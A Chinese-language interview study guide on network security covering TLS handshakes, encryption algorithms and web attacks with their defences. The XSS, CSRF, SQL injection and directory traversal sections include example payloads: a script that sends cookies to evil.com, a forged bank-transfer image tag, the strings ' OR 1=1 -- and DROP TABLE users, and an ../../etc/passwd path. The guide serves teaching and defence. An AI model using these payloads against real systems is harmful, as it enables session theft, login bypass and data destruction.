---
title: 网络安全 - TLS/SSL、Web攻击与加密算法
description: HTTPS/TLS握手、对称与非对称加密、中间人攻击、XSS/CSRF/SQL注入、CA证书
pubDate: '2025-02-24'
categories:
- Network
tags:
- HTTPS
- TLS
- XSS
- CSRF
- 面试
---
# 网络安全面试题

## 第1部分：面试常见问题与答案

### 面试高频问题
```
# Q1: HTTPS 的工作原理？TLS 握手过程？
# 答：见 TLS 详解

# Q2: 对称加密和非对称加密的区别？
# 答：
# 对称加密：加密和解密使用同一个密钥（AES, DES）
#   - 速度快，适合大量数据
#   - 问题：如何安全交换密钥？
# 非对称加密：公钥加密，私钥解密（RSA, ECC）
#   - 速度慢，安全性高
#   - 用于密钥交换和数字签名
# HTTPS 实际使用：非对称加密交换密钥 + 对称加密传输数据

# Q3: 什么是中间人攻击？如何防御？
# 答：
# 攻击者在客户端和服务端之间截获并篡改通信
# 防御：HTTPS + CA 证书验证 + 证书固定 (Certificate Pinning)

# Q4: XSS、CSRF、SQL 注入分别是什么？如何防御？
# 答：见各攻击详解

# Q5: 什么是 CA 证书？为什么需要它？
# 答：
# CA (Certificate Authority) 是可信的第三方机构
# 证书包含：域名、公钥、签发者、有效期、数字签名
# 作用：证明服务端身份，防止中间人攻击
# 浏览器内置受信任的 CA 根证书，形成信任链
```

---

## 第2部分：TLS/SSL 详解

### TLS 1.2 握手过程
```
客户端                                       服务端
  |                                           |
  | ① ClientHello                             |
  |   - 支持的 TLS 版本                        |
  |   - 支持的加密套件列表                      |
  |   - 客户端随机数 (Client Random)            |
  | ─────────────────────────────────────→     |
  |                                           |
  | ② ServerHello                             |
  |   - 选定的 TLS 版本和加密套件               |
  |   - 服务端随机数 (Server Random)            |
  | ③ Certificate（服务端证书）                 |
  | ④ ServerKeyExchange（DH 参数，可选）        |
  | ⑤ ServerHelloDone                         |
  | ←─────────────────────────────────────     |
  |                                           |
  | 客户端验证证书                              |
  |   - 检查 CA 签名                           |
  |   - 检查域名匹配                           |
  |   - 检查有效期                             |
  |                                           |
  | ⑥ ClientKeyExchange                       |
  |   - 预主密钥 (Pre-Master Secret)           |
  |   - 用服务端公钥加密                        |
  | ⑦ ChangeCipherSpec（切换到加密模式）         |
  | ⑧ Finished（加密的验证消息）                |
  | ─────────────────────────────────────→     |
  |                                           |
  | ⑨ ChangeCipherSpec                        |
  | ⑩ Finished                                |
  | ←─────────────────────────────────────     |
  |                                           |
  |  双方使用对称密钥加密通信                    |
  | ←═══════════════════════════════════→      |
```

### 密钥生成
```
# 会话密钥 = PRF(Pre-Master Secret, Client Random, Server Random)
#
# 为什么需要三个随机数？
# - Client Random 和 Server Random 是明文传输的
# - Pre-Master Secret 是加密传输的
# - 三个随机数混合确保会话密钥的随机性和安全性
```

### TLS 1.3 改进
```
# TLS 1.2 → TLS 1.3 的主要改进：

# ✅ 握手只需 1-RTT（TLS 1.2 需要 2-RTT）
# ✅ 支持 0-RTT 恢复（会话复用时）
# ✅ 移除不安全的加密套件（RC4, DES, SHA-1, RSA 密钥交换）
# ✅ 只保留 AEAD 加密模式（AES-GCM, ChaCha20-Poly1305）
# ✅ 强制前向保密 (PFS)：只支持 ECDHE/DHE 密钥交换
# ✅ 握手过程加密：ServerHello 之后的内容都是加密的

# 前向保密 (Perfect Forward Secrecy)：
# - 即使服务器私钥泄露，也无法解密之前的通信
# - 原因：每次会话使用临时的 DH 密钥对
```

---

## 第3部分：常见 Web 攻击

### XSS（跨站脚本攻击）

```
# 原理：攻击者将恶意脚本注入到网页中，在其他用户浏览器执行

# 三种类型：

# 1. 反射型 XSS（非持久型）
# 恶意代码在 URL 参数中，服务端直接返回到页面
# URL: https://example.com/search?q=<script>alert(document.cookie)</script>

# 2. 存储型 XSS（持久型，最危险）
# 恶意代码存储在数据库中，每次访问都会执行
# 例：评论区提交：<script>fetch('https://evil.com/steal?c='+document.cookie)</script>

# 3. DOM 型 XSS
# 纯前端漏洞，恶意代码通过 JS 操作 DOM 注入
# document.getElementById('output').innerHTML = location.hash.substring(1)

# 防御：
# 1. 输出编码：对用户输入进行 HTML 实体转义
#    < → &lt;  > → &gt;  " → &quot;  ' → &#x27;
# 2. CSP (Content-Security-Policy)：限制脚本来源
#    Content-Security-Policy: script-src 'self'
# 3. HttpOnly Cookie：JS 无法读取
# 4. 输入校验：白名单过滤
```

### CSRF（跨站请求伪造）

```
# 原理：诱导用户在已登录状态下访问恶意页面，自动发送伪造请求

# 攻击流程：
# 1. 用户登录 bank.com，浏览器保存了 Cookie
# 2. 用户访问恶意网站 evil.com
# 3. evil.com 页面包含：
#    <img src="https://bank.com/transfer?to=hacker&amount=10000">
# 4. 浏览器自动携带 bank.com 的 Cookie 发送请求
# 5. 银行服务器认为是合法请求 → 转账成功

# 防御：
# 1. CSRF Token
#    - 服务端生成随机 Token，嵌入表单
#    - 提交时验证 Token 是否匹配
#    <input type="hidden" name="csrf_token" value="random_token_123">

# 2. SameSite Cookie
#    Set-Cookie: session=abc; SameSite=Strict
#    - Strict：完全不允许跨站携带 Cookie
#    - Lax：只允许导航类 GET 请求携带

# 3. Referer/Origin 检查
#    - 验证请求来源是否为合法域名

# 4. 二次确认
#    - 敏感操作要求输入密码或验证码
```

### SQL 注入

```
# 原理：将恶意 SQL 代码注入到查询语句中

# 攻击示例：
# 正常查询：
# SELECT * FROM users WHERE name = 'alice' AND password = '123456'

# 注入攻击（输入用户名: ' OR 1=1 --）：
# SELECT * FROM users WHERE name = '' OR 1=1 --' AND password = ''
# 结果：绕过认证，返回所有用户

# 更危险的注入：
# 输入: '; DROP TABLE users; --
# SELECT * FROM users WHERE name = ''; DROP TABLE users; --'

# 防御：
# 1. 参数化查询 / 预编译语句（最有效）
#    cursor.execute("SELECT * FROM users WHERE name = %s", (username,))
#
# 2. ORM 框架（自动处理转义）
#    User.objects.filter(name=username)
#
# 3. 输入校验和转义
#    - 白名单验证
#    - 转义特殊字符
#
# 4. 最小权限原则
#    - 数据库账户只授予必要权限
#    - 禁止应用使用 root/admin 账户
```

### 其他常见攻击

```
# DDoS（分布式拒绝服务）：
# - 大量请求淹没服务器
# - 防御：CDN、WAF、流量清洗、限流

# 点击劫持 (Clickjacking)：
# - 透明 iframe 覆盖在正常页面上，诱导用户点击
# - 防御：X-Frame-Options: DENY 或 CSP frame-ancestors

# 目录遍历：
# - 通过 ../ 访问服务器敏感文件
# - https://example.com/file?name=../../etc/passwd
# - 防御：规范化路径、白名单

# SSRF（服务端请求伪造）：
# - 利用服务端发起请求访问内网资源
# - 防御：白名单校验 URL、禁止内网访问
```

---

## 第4部分：加密算法速查

### 对称加密

| 算法 | 密钥长度 | 特点 |
|------|---------|------|
| **AES** | 128/192/256 位 | 当前标准，安全高效 |
| **ChaCha20** | 256 位 | 适合移动设备，TLS 1.3 推荐 |
| **DES** | 56 位 | 已不安全，不推荐 |
| **3DES** | 168 位 | DES 的改进，逐渐淘汰 |

### 非对称加密

| 算法 | 用途 | 特点 |
|------|------|------|
| **RSA** | 加密 + 签名 | 应用最广，密钥长度 2048+ 位 |
| **ECC** | 加密 + 签名 | 更短密钥达到同等安全性，性能好 |
| **DH/ECDHE** | 密钥交换 | 不用于加密，仅协商共享密钥 |

### 哈希算法

| 算法 | 输出长度 | 安全性 |
|------|---------|-------|
| **MD5** | 128 位 | 已被破解，不安全 |
| **SHA-1** | 160 位 | 已被破解，不推荐 |
| **SHA-256** | 256 位 | 安全，广泛使用 |
| **bcrypt** | - | 密码存储专用，自带盐值和慢哈希 |

### 数字签名流程
```
# 签名（发送方）：
# 1. 对消息计算哈希值：hash = SHA256(message)
# 2. 用私钥加密哈希值：signature = RSA_Encrypt(hash, private_key)
# 3. 发送：message + signature

# 验签（接收方）：
# 1. 用公钥解密签名：hash1 = RSA_Decrypt(signature, public_key)
# 2. 对消息计算哈希值：hash2 = SHA256(message)
# 3. 比较：hash1 == hash2 → 签名有效
```
